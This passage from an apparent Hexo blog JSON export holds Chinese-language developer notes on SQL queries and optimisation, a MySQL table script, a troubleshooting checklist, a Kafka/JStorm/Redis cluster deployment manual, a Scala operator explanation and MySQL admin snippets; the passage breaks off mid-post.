a.organ_flag,</span><br><span class=\"line\">  a.question_score,</span><br><span class=\"line\">  a.prodta_no,</span><br><span class=\"line\">  a.paper_type,</span><br><span class=\"line\">  a.question_no,</span><br><span class=\"line\">  d.base_score,</span><br><span class=\"line\">  a.delete_flag AS myflag,</span><br><span class=\"line\">  d.delete_flag</span><br><span class=\"line\">FROM</span><br><span class=\"line\">  hs_asset.eligpaperquestrel a LEFT JOIN hs_asset.eligpaper d</span><br><span class=\"line\">    ON a.paper_type = d.paper_type</span><br><span class=\"line\">       AND a.prodta_no = d.prodta_no</span><br><span class=\"line\">       AND a.organ_flag = d.organ_flag</span><br><span class=\"line\">       AND d.delete_flag = &apos;0&apos; -- ORDER BY a.question_no</span><br><span class=\"line\">--AND a.delete_flag = &apos;0&apos;</span><br><span class=\"line\">WHERE A.QUESTION_NO = &apos;53&apos; AND a.paper_type = &apos;-&apos; AND a.prodta_no = &apos; &apos;;</span><br></pre></td></tr></table></figure>"},{"title":"语句优化","date":"2018-07-10T13:09:19.000Z","_content":"- #### 用insert代替update\n- #### 少用子查询\n- #### 用连表代替\n","source":"_posts/数据库/语句优化.md","raw":"---\ntitle: 语句优化\ndate: 2018-07-10 21:09:19\ntags: 数据库\n---\n- #### 用insert代替update\n- #### 少用子查询\n- #### 用连表代替\n","slug":"数据库/语句优化","published":1,"updated":"2018-07-10T13:10:10.008Z","_id":"cjjedmhcs00910gtjb3l3cicp","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"用insert代替update\"><a href=\"#用insert代替update\" class=\"headerlink\" title=\"用insert代替update\"></a>用insert代替update</h4></li>\n<li><h4 id=\"少用子查询\"><a href=\"#少用子查询\" class=\"headerlink\" title=\"少用子查询\"></a>少用子查询</h4></li>\n<li><h4 id=\"用连表代替\"><a href=\"#用连表代替\" class=\"headerlink\" title=\"用连表代替\"></a>用连表代替</h4></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"用insert代替update\"><a href=\"#用insert代替update\" class=\"headerlink\" title=\"用insert代替update\"></a>用insert代替update</h4></li>\n<li><h4 id=\"少用子查询\"><a href=\"#少用子查询\" class=\"headerlink\" title=\"少用子查询\"></a>少用子查询</h4></li>\n<li><h4 id=\"用连表代替\"><a href=\"#用连表代替\" class=\"headerlink\" title=\"用连表代替\"></a>用连表代替</h4></li>\n</ul>\n"},{"title":"jioben","date":"2018-07-10T13:09:19.000Z","_content":"```\ndrop table accept;\nCREATE TABLE `accept` (\n  `CLIENT_ID` varchar(18) NOT NULL,\n  `ORGAN_FLAG` char(2) DEFAULT '',\n  `BRANCH_NO` decimal(10,0) NOT NULL DEFAULT '0',\n  `ACPT_CATEGORY_NO` varchar(4) NOT NULL DEFAULT '',\n  `ACPT_CATEGORY_NAME` varchar(64) NOT NULL,\n  `PASS_FLAG` char(10) DEFAULT NULL,\n  `PARAM_VALUE` varchar(2000) DEFAULT NULL,\n  `INIT_DATE` decimal(10,0) DEFAULT NULL,\n  `SEQ_ID` bigint(20) NOT NULL AUTO_INCREMENT,\n  UNIQUE KEY `accept_SEQ_ID_uindex` (`SEQ_ID`)\n) ENGINE=InnoDB AUTO_INCREMENT=2578 DEFAULT CHARSET=utf8;","source":"_posts/项目/jioben.md","raw":"---\ntitle: jioben\ndate: 2018-07-10 21:09:19\ntags: 项目\n---\n```\ndrop table accept;\nCREATE TABLE `accept` (\n  `CLIENT_ID` varchar(18) NOT NULL,\n  `ORGAN_FLAG` char(2) DEFAULT '',\n  `BRANCH_NO` decimal(10,0) NOT NULL DEFAULT '0',\n  `ACPT_CATEGORY_NO` varchar(4) NOT NULL DEFAULT '',\n  `ACPT_CATEGORY_NAME` varchar(64) NOT NULL,\n  `PASS_FLAG` char(10) DEFAULT NULL,\n  `PARAM_VALUE` varchar(2000) DEFAULT NULL,\n  `INIT_DATE` decimal(10,0) DEFAULT NULL,\n  `SEQ_ID` bigint(20) NOT NULL AUTO_INCREMENT,\n  UNIQUE KEY `accept_SEQ_ID_uindex` (`SEQ_ID`)\n) ENGINE=InnoDB AUTO_INCREMENT=2578 DEFAULT CHARSET=utf8;","slug":"项目/jioben","published":1,"updated":"2018-07-10T13:10:10.028Z","_id":"cjjedmhd4009c0gtjpvwdk03s","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code><br>drop table accept;<br>CREATE TABLE <code>accept</code> (<br>  <code>CLIENT_ID</code> varchar(18) NOT NULL,<br>  <code>ORGAN_FLAG</code> char(2) DEFAULT ‘’,<br>  <code>BRANCH_NO</code> decimal(10,0) NOT NULL DEFAULT ‘0’,<br>  <code>ACPT_CATEGORY_NO</code> varchar(4) NOT NULL DEFAULT ‘’,<br>  <code>ACPT_CATEGORY_NAME</code> varchar(64) NOT NULL,<br>  <code>PASS_FLAG</code> char(10) DEFAULT NULL,<br>  <code>PARAM_VALUE</code> varchar(2000) DEFAULT NULL,<br>  <code>INIT_DATE</code> decimal(10,0) DEFAULT NULL,<br>  <code>SEQ_ID</code> bigint(20) NOT NULL AUTO_INCREMENT,<br>  UNIQUE KEY <code>accept_SEQ_ID_uindex</code> (<code>SEQ_ID</code>)<br>) ENGINE=InnoDB AUTO_INCREMENT=2578 DEFAULT CHARSET=utf8;</p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>`</code><br>drop table accept;<br>CREATE TABLE <code>accept</code> (<br>  <code>CLIENT_ID</code> varchar(18) NOT NULL,<br>  <code>ORGAN_FLAG</code> char(2) DEFAULT ‘’,<br>  <code>BRANCH_NO</code> decimal(10,0) NOT NULL DEFAULT ‘0’,<br>  <code>ACPT_CATEGORY_NO</code> varchar(4) NOT NULL DEFAULT ‘’,<br>  <code>ACPT_CATEGORY_NAME</code> varchar(64) NOT NULL,<br>  <code>PASS_FLAG</code> char(10) DEFAULT NULL,<br>  <code>PARAM_VALUE</code> varchar(2000) DEFAULT NULL,<br>  <code>INIT_DATE</code> decimal(10,0) DEFAULT NULL,<br>  <code>SEQ_ID</code> bigint(20) NOT NULL AUTO_INCREMENT,<br>  UNIQUE KEY <code>accept_SEQ_ID_uindex</code> (<code>SEQ_ID</code>)<br>) ENGINE=InnoDB AUTO_INCREMENT=2578 DEFAULT CHARSET=utf8;</p>\n"},{"title":"排错","date":"2018-07-10T13:09:19.000Z","_content":"- ### 1 大数据工具\n#### 404 \n\n1 看配置文件tomcat/webapps/ubas-console-server/WEB-INF/classes/application.yml\n\n2 大数据工具mysql数据库配置：用户名、密码、远程访问权限\n\n3 hsstr.sql是否运行过\n\n 看tomcat日志，找具体报错\n","source":"_posts/项目/排错.md","raw":"---\ntitle: 排错\ndate: 2018-07-10 21:09:19\ntags: 项目\n---\n- ### 1 大数据工具\n#### 404 \n\n1 看配置文件tomcat/webapps/ubas-console-server/WEB-INF/classes/application.yml\n\n2 大数据工具mysql数据库配置：用户名、密码、远程访问权限\n\n3 hsstr.sql是否运行过\n\n 看tomcat日志，找具体报错\n","slug":"项目/排错","published":1,"updated":"2018-07-10T13:10:10.030Z","_id":"cjjedmhd4009d0gtj48673y5p","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h3 id=\"1-大数据工具\"><a href=\"#1-大数据工具\" class=\"headerlink\" title=\"1 大数据工具\"></a>1 大数据工具</h3><h4 id=\"404\"><a href=\"#404\" class=\"headerlink\" title=\"404\"></a>404</h4></li>\n</ul>\n<p>1 看配置文件tomcat/webapps/ubas-console-server/WEB-INF/classes/application.yml</p>\n<p>2 大数据工具mysql数据库配置：用户名、密码、远程访问权限</p>\n<p>3 hsstr.sql是否运行过</p>\n<p> 看tomcat日志，找具体报错</p>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h3 id=\"1-大数据工具\"><a href=\"#1-大数据工具\" class=\"headerlink\" title=\"1 大数据工具\"></a>1 大数据工具</h3><h4 id=\"404\"><a href=\"#404\" class=\"headerlink\" title=\"404\"></a>404</h4></li>\n</ul>\n<p>1 看配置文件tomcat/webapps/ubas-console-server/WEB-INF/classes/application.yml</p>\n<p>2 大数据工具mysql数据库配置：用户名、密码、远程访问权限</p>\n<p>3 hsstr.sql是否运行过</p>\n<p> 看tomcat日志，找具体报错</p>\n"},{"title":"实时账户分析安装部署手册","date":"2018-07-10T13:09:19.000Z","_content":"# 实时账户分析安装部署手册\r\n@[安装说明, 实时账户分析, V1.0.1] \r\n------\r\n[TOC]\r\n## 前提条件\r\n完成账户分析离线计算大数据环境\r\n\r\n------\r\n## 集群搭建\r\n### 步骤一\r\n从安装包中获取rt.tar.gz,并解压\r\n`# tar -zxf rt.tar.gz`\r\n解压后在目录有如下文件\r\n\r\nconf.tar.gz  （redis集群master-slave和HA配置文件）  \r\njson（集群配置信息）  \r\njstorm.tar.gz （jstorm安装文件）  \r\nkafka_2.11-0.9.0.1.tgz（kafka安装文件）  \r\nredis-4.0.1.tar.gz（redis安装文件）  \r\nrtConfig-0.0.1-SNAPSHOT.jar（集群配置程序）  \r\nstartCluster.sh（集群配置脚本）\r\n\r\n### 步骤二\r\n根据集群情况修改json文件   \r\n{   \r\n    \"basePath\": \"/opt/rt\",   \r\n    \"hosts\": \"hs01,hs02,hs03\",   \r\n    \"nimbus.host\": \"10.20.23.51\",   \r\n    \"redis.host\": \"10.20.23.51\",   \r\n    \"zookeeper\": \"hs01:2181,hs02:2181,hs03:2181\"   \r\n}   \r\n其中：\r\nbasePath\t实时计算环境安装的基础目录，kafka、jstorm和redis都会安装在该目录下  \r\nhosts\t安装kafka、jstorm集群的节点   \r\nredis.host\t安装redis集群的节点（只能写ip）  \r\nzookeeper\t集群使用的zookeeper节点（在离线计算环境安装时已部署）  \r\nnimbus.host\tjstorm的nimbus节点（只能写ip）\r\n\r\n确认执行脚本的用户在basePath有读写权限。\r\n### 步骤三\r\n运行startCluster.sh  \r\n\r\n`./startCluster.sh`\r\n\r\n------\r\n## 启动集群\r\n### kafka\r\n在各个节点上启动kafka服务(节点对应json文件中hosts)   \r\n切换到kafka安装目录下   \r\n`bin/kafka-server-start.sh -daemon config/server.properties`   \r\n创建topic，指定分区数，复制因子，topic的名称，创建名字为accouont，一个分区，一个副本的topic，并查看topic的状态(zookeeper对应json文件中zookeeper)   \r\n`bin/kafka-topics.sh --create --zookeeper hs01:2181,hs02:2181,hs03:2181 --replication-factor 1 --partitions 1 --topic account`\r\n\r\n查看topic状态\r\n`bin/kafka-topics.sh --describe --zookeeper hs01:2181,hs02:2181,hs03:2181 --topic account`\r\n\r\n### jstorm\r\n在各个节点上启动jstorm服务(节点对应json文件中hosts)    \r\n切换到jstorm的安装目录bin文件夹下   \r\n`./start.sh`\r\n\r\n### redis\r\n在redis的节点中启动服务（redis节点对应json文件中的redis.host）   \r\n切换到redis的安装目录下   \r\n`src/redis-server conf/redis_master_6379.conf`   \r\n`src/redis-server conf/redis_slave_6377.conf`   \r\n`src/redis-server conf/redis_slave_6378.conf`   \r\n`src/redis-sentinel conf/sentinel_63791.conf`   \r\n`src/redis-sentinel conf/sentinel_63792.conf`\r\n\r\n------\r\n## 实时账户分析应用启动\r\n### 步骤一\r\n修改files目录下redis.properties和dataSource.properties文件，包含redis集群的配置信息和关系数据库配置信息。\r\n\r\n运行`./updateJarConfig.sh`\r\n\r\n### 步骤二\r\n提交实时计算到jstorm集群中   \r\n\r\n1、业务准入   \r\njstorm jar hs-rt-account-0.0.1-SNAPSHOT.jar com.hundsun.account.hs_rt_account.jstorm.topology.AcceptTopology\r\n\r\n2、持仓分析   \r\njstorm jar hs-rt-account-0.0.1-SNAPSHOT.jar com.hundsun.account.hs_rt_account.jstorm.topology.PositionTopology\r\n\r\n### 步骤三\r\n确认任务提交无误\r\njstorm list\r\n","source":"_posts/项目/实时账户分析安装部署手册.md","raw":"---\ntitle: 实时账户分析安装部署手册\ndate: 2018-07-10 21:09:19\ntags: 项目\n---\n# 实时账户分析安装部署手册\r\n@[安装说明, 实时账户分析, V1.0.1] \r\n------\r\n[TOC]\r\n## 前提条件\r\n完成账户分析离线计算大数据环境\r\n\r\n------\r\n## 集群搭建\r\n### 步骤一\r\n从安装包中获取rt.tar.gz,并解压\r\n`# tar -zxf rt.tar.gz`\r\n解压后在目录有如下文件\r\n\r\nconf.tar.gz  （redis集群master-slave和HA配置文件）  \r\njson（集群配置信息）  \r\njstorm.tar.gz （jstorm安装文件）  \r\nkafka_2.11-0.9.0.1.tgz（kafka安装文件）  \r\nredis-4.0.1.tar.gz（redis安装文件）  \r\nrtConfig-0.0.1-SNAPSHOT.jar（集群配置程序）  \r\nstartCluster.sh（集群配置脚本）\r\n\r\n### 步骤二\r\n根据集群情况修改json文件   \r\n{   \r\n    \"basePath\": \"/opt/rt\",   \r\n    \"hosts\": \"hs01,hs02,hs03\",   \r\n    \"nimbus.host\": \"10.20.23.51\",   \r\n    \"redis.host\": \"10.20.23.51\",   \r\n    \"zookeeper\": \"hs01:2181,hs02:2181,hs03:2181\"   \r\n}   \r\n其中：\r\nbasePath\t实时计算环境安装的基础目录，kafka、jstorm和redis都会安装在该目录下  \r\nhosts\t安装kafka、jstorm集群的节点   \r\nredis.host\t安装redis集群的节点（只能写ip）  \r\nzookeeper\t集群使用的zookeeper节点（在离线计算环境安装时已部署）  \r\nnimbus.host\tjstorm的nimbus节点（只能写ip）\r\n\r\n确认执行脚本的用户在basePath有读写权限。\r\n### 步骤三\r\n运行startCluster.sh  \r\n\r\n`./startCluster.sh`\r\n\r\n------\r\n## 启动集群\r\n### kafka\r\n在各个节点上启动kafka服务(节点对应json文件中hosts)   \r\n切换到kafka安装目录下   \r\n`bin/kafka-server-start.sh -daemon config/server.properties`   \r\n创建topic，指定分区数，复制因子，topic的名称，创建名字为accouont，一个分区，一个副本的topic，并查看topic的状态(zookeeper对应json文件中zookeeper)   \r\n`bin/kafka-topics.sh --create --zookeeper hs01:2181,hs02:2181,hs03:2181 --replication-factor 1 --partitions 1 --topic account`\r\n\r\n查看topic状态\r\n`bin/kafka-topics.sh --describe --zookeeper hs01:2181,hs02:2181,hs03:2181 --topic account`\r\n\r\n### jstorm\r\n在各个节点上启动jstorm服务(节点对应json文件中hosts)    \r\n切换到jstorm的安装目录bin文件夹下   \r\n`./start.sh`\r\n\r\n### redis\r\n在redis的节点中启动服务（redis节点对应json文件中的redis.host）   \r\n切换到redis的安装目录下   \r\n`src/redis-server conf/redis_master_6379.conf`   \r\n`src/redis-server conf/redis_slave_6377.conf`   \r\n`src/redis-server conf/redis_slave_6378.conf`   \r\n`src/redis-sentinel conf/sentinel_63791.conf`   \r\n`src/redis-sentinel conf/sentinel_63792.conf`\r\n\r\n------\r\n## 实时账户分析应用启动\r\n### 步骤一\r\n修改files目录下redis.properties和dataSource.properties文件，包含redis集群的配置信息和关系数据库配置信息。\r\n\r\n运行`./updateJarConfig.sh`\r\n\r\n### 步骤二\r\n提交实时计算到jstorm集群中   \r\n\r\n1、业务准入   \r\njstorm jar hs-rt-account-0.0.1-SNAPSHOT.jar com.hundsun.account.hs_rt_account.jstorm.topology.AcceptTopology\r\n\r\n2、持仓分析   \r\njstorm jar hs-rt-account-0.0.1-SNAPSHOT.jar com.hundsun.account.hs_rt_account.jstorm.topology.PositionTopology\r\n\r\n### 步骤三\r\n确认任务提交无误\r\njstorm list\r\n","slug":"项目/实时账户分析安装部署手册","published":1,"updated":"2018-07-10T13:10:10.029Z","_id":"cjjedmhd5009f0gtj1tijqr17","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"实时账户分析安装部署手册\"><a href=\"#实时账户分析安装部署手册\" class=\"headerlink\" title=\"实时账户分析安装部署手册\"></a>实时账户分析安装部署手册</h1><h2 id=\"安装说明-实时账户分析-V1-0-1\"><a href=\"#安装说明-实时账户分析-V1-0-1\" class=\"headerlink\" title=\"@[安装说明, 实时账户分析, V1.0.1] \"></a>@[安装说明, 实时账户分析, V1.0.1] </h2><p>[TOC]</p>\n<h2 id=\"前提条件\"><a href=\"#前提条件\" class=\"headerlink\" title=\"前提条件\"></a>前提条件</h2><p>完成账户分析离线计算大数据环境</p>\n<hr>\n<h2 id=\"集群搭建\"><a href=\"#集群搭建\" class=\"headerlink\" title=\"集群搭建\"></a>集群搭建</h2><h3 id=\"步骤一\"><a href=\"#步骤一\" class=\"headerlink\" title=\"步骤一\"></a>步骤一</h3><p>从安装包中获取rt.tar.gz,并解压<br><code># tar -zxf rt.tar.gz</code><br>解压后在目录有如下文件</p>\n<p>conf.tar.gz  （redis集群master-slave和HA配置文件）<br>json（集群配置信息）<br>jstorm.tar.gz （jstorm安装文件）<br>kafka_2.11-0.9.0.1.tgz（kafka安装文件）<br>redis-4.0.1.tar.gz（redis安装文件）<br>rtConfig-0.0.1-SNAPSHOT.jar（集群配置程序）<br>startCluster.sh（集群配置脚本）</p>\n<h3 id=\"步骤二\"><a href=\"#步骤二\" class=\"headerlink\" title=\"步骤二\"></a>步骤二</h3><p>根据集群情况修改json文件<br>{<br>    “basePath”: “/opt/rt”,<br>    “hosts”: “hs01,hs02,hs03”,<br>    “nimbus.host”: “10.20.23.51”,<br>    “redis.host”: “10.20.23.51”,<br>    “zookeeper”: “hs01:2181,hs02:2181,hs03:2181”<br>}<br>其中：<br>basePath    实时计算环境安装的基础目录，kafka、jstorm和redis都会安装在该目录下<br>hosts    安装kafka、jstorm集群的节点<br>redis.host    安装redis集群的节点（只能写ip）<br>zookeeper    集群使用的zookeeper节点（在离线计算环境安装时已部署）<br>nimbus.host    jstorm的nimbus节点（只能写ip）</p>\n<p>确认执行脚本的用户在basePath有读写权限。</p>\n<h3 id=\"步骤三\"><a href=\"#步骤三\" class=\"headerlink\" title=\"步骤三\"></a>步骤三</h3><p>运行startCluster.sh  </p>\n<p><code>./startCluster.sh</code></p>\n<hr>\n<h2 id=\"启动集群\"><a href=\"#启动集群\" class=\"headerlink\" title=\"启动集群\"></a>启动集群</h2><h3 id=\"kafka\"><a href=\"#kafka\" class=\"headerlink\" title=\"kafka\"></a>kafka</h3><p>在各个节点上启动kafka服务(节点对应json文件中hosts)<br>切换到kafka安装目录下<br><code>bin/kafka-server-start.sh -daemon config/server.properties</code><br>创建topic，指定分区数，复制因子，topic的名称，创建名字为accouont，一个分区，一个副本的topic，并查看topic的状态(zookeeper对应json文件中zookeeper)<br><code>bin/kafka-topics.sh --create --zookeeper hs01:2181,hs02:2181,hs03:2181 --replication-factor 1 --partitions 1 --topic account</code></p>\n<p>查看topic状态<br><code>bin/kafka-topics.sh --describe --zookeeper hs01:2181,hs02:2181,hs03:2181 --topic account</code></p>\n<h3 id=\"jstorm\"><a href=\"#jstorm\" class=\"headerlink\" title=\"jstorm\"></a>jstorm</h3><p>在各个节点上启动jstorm服务(节点对应json文件中hosts)<br>切换到jstorm的安装目录bin文件夹下<br><code>./start.sh</code></p>\n<h3 id=\"redis\"><a href=\"#redis\" class=\"headerlink\" title=\"redis\"></a>redis</h3><p>在redis的节点中启动服务（redis节点对应json文件中的redis.host）<br>切换到redis的安装目录下<br><code>src/redis-server conf/redis_master_6379.conf</code><br><code>src/redis-server conf/redis_slave_6377.conf</code><br><code>src/redis-server conf/redis_slave_6378.conf</code><br><code>src/redis-sentinel conf/sentinel_63791.conf</code><br><code>src/redis-sentinel conf/sentinel_63792.conf</code></p>\n<hr>\n<h2 id=\"实时账户分析应用启动\"><a href=\"#实时账户分析应用启动\" class=\"headerlink\" title=\"实时账户分析应用启动\"></a>实时账户分析应用启动</h2><h3 id=\"步骤一-1\"><a href=\"#步骤一-1\" class=\"headerlink\" title=\"步骤一\"></a>步骤一</h3><p>修改files目录下redis.properties和dataSource.properties文件，包含redis集群的配置信息和关系数据库配置信息。</p>\n<p>运行<code>./updateJarConfig.sh</code></p>\n<h3 id=\"步骤二-1\"><a href=\"#步骤二-1\" class=\"headerlink\" title=\"步骤二\"></a>步骤二</h3><p>提交实时计算到jstorm集群中   </p>\n<p>1、业务准入<br>jstorm jar hs-rt-account-0.0.1-SNAPSHOT.jar com.hundsun.account.hs_rt_account.jstorm.topology.AcceptTopology</p>\n<p>2、持仓分析<br>jstorm jar hs-rt-account-0.0.1-SNAPSHOT.jar com.hundsun.account.hs_rt_account.jstorm.topology.PositionTopology</p>\n<h3 id=\"步骤三-1\"><a href=\"#步骤三-1\" class=\"headerlink\" title=\"步骤三\"></a>步骤三</h3><p>确认任务提交无误<br>jstorm list</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"实时账户分析安装部署手册\"><a href=\"#实时账户分析安装部署手册\" class=\"headerlink\" title=\"实时账户分析安装部署手册\"></a>实时账户分析安装部署手册</h1><h2 id=\"安装说明-实时账户分析-V1-0-1\"><a href=\"#安装说明-实时账户分析-V1-0-1\" class=\"headerlink\" title=\"@[安装说明, 实时账户分析, V1.0.1] \"></a>@[安装说明, 实时账户分析, V1.0.1] </h2><p>[TOC]</p>\n<h2 id=\"前提条件\"><a href=\"#前提条件\" class=\"headerlink\" title=\"前提条件\"></a>前提条件</h2><p>完成账户分析离线计算大数据环境</p>\n<hr>\n<h2 id=\"集群搭建\"><a href=\"#集群搭建\" class=\"headerlink\" title=\"集群搭建\"></a>集群搭建</h2><h3 id=\"步骤一\"><a href=\"#步骤一\" class=\"headerlink\" title=\"步骤一\"></a>步骤一</h3><p>从安装包中获取rt.tar.gz,并解压<br><code># tar -zxf rt.tar.gz</code><br>解压后在目录有如下文件</p>\n<p>conf.tar.gz  （redis集群master-slave和HA配置文件）<br>json（集群配置信息）<br>jstorm.tar.gz （jstorm安装文件）<br>kafka_2.11-0.9.0.1.tgz（kafka安装文件）<br>redis-4.0.1.tar.gz（redis安装文件）<br>rtConfig-0.0.1-SNAPSHOT.jar（集群配置程序）<br>startCluster.sh（集群配置脚本）</p>\n<h3 id=\"步骤二\"><a href=\"#步骤二\" class=\"headerlink\" title=\"步骤二\"></a>步骤二</h3><p>根据集群情况修改json文件<br>{<br>    “basePath”: “/opt/rt”,<br>    “hosts”: “hs01,hs02,hs03”,<br>    “nimbus.host”: “10.20.23.51”,<br>    “redis.host”: “10.20.23.51”,<br>    “zookeeper”: “hs01:2181,hs02:2181,hs03:2181”<br>}<br>其中：<br>basePath    实时计算环境安装的基础目录，kafka、jstorm和redis都会安装在该目录下<br>hosts    安装kafka、jstorm集群的节点<br>redis.host    安装redis集群的节点（只能写ip）<br>zookeeper    集群使用的zookeeper节点（在离线计算环境安装时已部署）<br>nimbus.host    jstorm的nimbus节点（只能写ip）</p>\n<p>确认执行脚本的用户在basePath有读写权限。</p>\n<h3 id=\"步骤三\"><a href=\"#步骤三\" class=\"headerlink\" title=\"步骤三\"></a>步骤三</h3><p>运行startCluster.sh  </p>\n<p><code>./startCluster.sh</code></p>\n<hr>\n<h2 id=\"启动集群\"><a href=\"#启动集群\" class=\"headerlink\" title=\"启动集群\"></a>启动集群</h2><h3 id=\"kafka\"><a href=\"#kafka\" class=\"headerlink\" title=\"kafka\"></a>kafka</h3><p>在各个节点上启动kafka服务(节点对应json文件中hosts)<br>切换到kafka安装目录下<br><code>bin/kafka-server-start.sh -daemon config/server.properties</code><br>创建topic，指定分区数，复制因子，topic的名称，创建名字为accouont，一个分区，一个副本的topic，并查看topic的状态(zookeeper对应json文件中zookeeper)<br><code>bin/kafka-topics.sh --create --zookeeper hs01:2181,hs02:2181,hs03:2181 --replication-factor 1 --partitions 1 --topic account</code></p>\n<p>查看topic状态<br><code>bin/kafka-topics.sh --describe --zookeeper hs01:2181,hs02:2181,hs03:2181 --topic account</code></p>\n<h3 id=\"jstorm\"><a href=\"#jstorm\" class=\"headerlink\" title=\"jstorm\"></a>jstorm</h3><p>在各个节点上启动jstorm服务(节点对应json文件中hosts)<br>切换到jstorm的安装目录bin文件夹下<br><code>./start.sh</code></p>\n<h3 id=\"redis\"><a href=\"#redis\" class=\"headerlink\" title=\"redis\"></a>redis</h3><p>在redis的节点中启动服务（redis节点对应json文件中的redis.host）<br>切换到redis的安装目录下<br><code>src/redis-server conf/redis_master_6379.conf</code><br><code>src/redis-server conf/redis_slave_6377.conf</code><br><code>src/redis-server conf/redis_slave_6378.conf</code><br><code>src/redis-sentinel conf/sentinel_63791.conf</code><br><code>src/redis-sentinel conf/sentinel_63792.conf</code></p>\n<hr>\n<h2 id=\"实时账户分析应用启动\"><a href=\"#实时账户分析应用启动\" class=\"headerlink\" title=\"实时账户分析应用启动\"></a>实时账户分析应用启动</h2><h3 id=\"步骤一-1\"><a href=\"#步骤一-1\" class=\"headerlink\" title=\"步骤一\"></a>步骤一</h3><p>修改files目录下redis.properties和dataSource.properties文件，包含redis集群的配置信息和关系数据库配置信息。</p>\n<p>运行<code>./updateJarConfig.sh</code></p>\n<h3 id=\"步骤二-1\"><a href=\"#步骤二-1\" class=\"headerlink\" title=\"步骤二\"></a>步骤二</h3><p>提交实时计算到jstorm集群中   </p>\n<p>1、业务准入<br>jstorm jar hs-rt-account-0.0.1-SNAPSHOT.jar com.hundsun.account.hs_rt_account.jstorm.topology.AcceptTopology</p>\n<p>2、持仓分析<br>jstorm jar hs-rt-account-0.0.1-SNAPSHOT.jar com.hundsun.account.hs_rt_account.jstorm.topology.PositionTopology</p>\n<h3 id=\"步骤三-1\"><a href=\"#步骤三-1\" class=\"headerlink\" title=\"步骤三\"></a>步骤三</h3><p>确认任务提交无误<br>jstorm list</p>\n"},{"title":"箭头","date":"2018-07-10T13:09:19.000Z","_content":"->\n\n[stackoverflow](https://stackoverflow.com/questions/4980515/scala-maps-operator)\n\nthe -> operator is a shorthand for associating a key with a value when used in the context of a map. In some languages, you are simply allowed to pass the pair of the key and value (usually with the key in the first position and the value in the second) to the constructor or one of the various methods on a map and it will be handled appropriately -- this is also allowed with Scala maps.\n\nHowever, Scala also provides the shorthand form of key -> value, which, as you've discovered, is defined in Predef via an implicit, to make the association more clear. Essentially it's saying: \"take the item on the left and map it to the item on the right.\" You'll notice if you read the definition of the Map object, that it does not define any methods that obviously use this -> method. Instead, the methods take objects of type Tuple2 (this is a tuple of 2 values: e.g. (item1, item2)), which Scala implicity converts via the method in Predef.\n\nIn some languages, the -> syntax is defined as part of the language itself, but due to the flexibility of Scala, this is able to be defined simply as a method.\n\n","source":"_posts/spark/scala/箭头.md","raw":"---\ntitle: 箭头\ndate: 2018-07-10 21:09:19\ntags: scala\n---\n->\n\n[stackoverflow](https://stackoverflow.com/questions/4980515/scala-maps-operator)\n\nthe -> operator is a shorthand for associating a key with a value when used in the context of a map. In some languages, you are simply allowed to pass the pair of the key and value (usually with the key in the first position and the value in the second) to the constructor or one of the various methods on a map and it will be handled appropriately -- this is also allowed with Scala maps.\n\nHowever, Scala also provides the shorthand form of key -> value, which, as you've discovered, is defined in Predef via an implicit, to make the association more clear. Essentially it's saying: \"take the item on the left and map it to the item on the right.\" You'll notice if you read the definition of the Map object, that it does not define any methods that obviously use this -> method. Instead, the methods take objects of type Tuple2 (this is a tuple of 2 values: e.g. (item1, item2)), which Scala implicity converts via the method in Predef.\n\nIn some languages, the -> syntax is defined as part of the language itself, but due to the flexibility of Scala, this is able to be defined simply as a method.\n\n","slug":"spark/scala/箭头","published":1,"updated":"2018-07-10T13:10:09.991Z","_id":"cjjedmhd6009g0gtjdhjfd7zd","comments":1,"layout":"post","photos":[],"link":"","content":"<p>-&gt;</p>\n<p><a href=\"https://stackoverflow.com/questions/4980515/scala-maps-operator\" target=\"_blank\" rel=\"noopener\">stackoverflow</a></p>\n<p>the -&gt; operator is a shorthand for associating a key with a value when used in the context of a map. In some languages, you are simply allowed to pass the pair of the key and value (usually with the key in the first position and the value in the second) to the constructor or one of the various methods on a map and it will be handled appropriately – this is also allowed with Scala maps.</p>\n<p>However, Scala also provides the shorthand form of key -&gt; value, which, as you’ve discovered, is defined in Predef via an implicit, to make the association more clear. Essentially it’s saying: “take the item on the left and map it to the item on the right.” You’ll notice if you read the definition of the Map object, that it does not define any methods that obviously use this -&gt; method. Instead, the methods take objects of type Tuple2 (this is a tuple of 2 values: e.g. (item1, item2)), which Scala implicity converts via the method in Predef.</p>\n<p>In some languages, the -&gt; syntax is defined as part of the language itself, but due to the flexibility of Scala, this is able to be defined simply as a method.</p>\n","site":{"data":{}},"excerpt":"","more":"<p>-&gt;</p>\n<p><a href=\"https://stackoverflow.com/questions/4980515/scala-maps-operator\" target=\"_blank\" rel=\"noopener\">stackoverflow</a></p>\n<p>the -&gt; operator is a shorthand for associating a key with a value when used in the context of a map. In some languages, you are simply allowed to pass the pair of the key and value (usually with the key in the first position and the value in the second) to the constructor or one of the various methods on a map and it will be handled appropriately – this is also allowed with Scala maps.</p>\n<p>However, Scala also provides the shorthand form of key -&gt; value, which, as you’ve discovered, is defined in Predef via an implicit, to make the association more clear. Essentially it’s saying: “take the item on the left and map it to the item on the right.” You’ll notice if you read the definition of the Map object, that it does not define any methods that obviously use this -&gt; method. Instead, the methods take objects of type Tuple2 (this is a tuple of 2 values: e.g. (item1, item2)), which Scala implicity converts via the method in Predef.</p>\n<p>In some languages, the -&gt; syntax is defined as part of the language itself, but due to the flexibility of Scala, this is able to be defined simply as a method.</p>\n"},{"title":"MySQL","date":"2018-07-10T13:09:19.000Z","_content":"- #### 修改用户名密码：\n```\nUPDATE user SET password=PASSWORD('123456') WHERE user='root';\nFLUSH PRIVILEGES;\n```\n- #### 查勘表结构\n```\nshow Create table 【tablename】\n```\n- #### update\n```\nUPDATE [LOW_PRIORITY] [IGNORE] tbl_name  \nSET col_name1=expr1 [, col_name2=expr2 ...]  \n[WHERE where_definition]  \n[ORDER BY ...]  \n[LIMIT row_count] \n```\n- #### 用户权限和远程连接\n```\nmysql> USE mysql; -- 切换到 mysql DB\n\nDatabase changed\n\nmysql> SELECT User, Password, Host FROM user; -- 